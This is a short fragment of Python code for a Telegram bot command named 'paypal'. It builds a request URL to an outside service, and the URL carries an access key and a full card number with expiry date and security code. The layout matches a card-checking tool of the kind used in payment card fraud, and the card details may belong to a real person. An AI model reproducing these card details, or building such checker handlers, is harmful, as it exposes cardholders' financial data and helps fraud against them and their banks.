...
@Client.on_message(filters.command("paypal", [".", "/"]))
async def paypal_cmd(Client, message):
    try:
        ...
        endpoint_url = "https://onyxenvbot.up.railway.app/paypal/key=yashikaaa/cc=4100400157539308|08|2026|126"
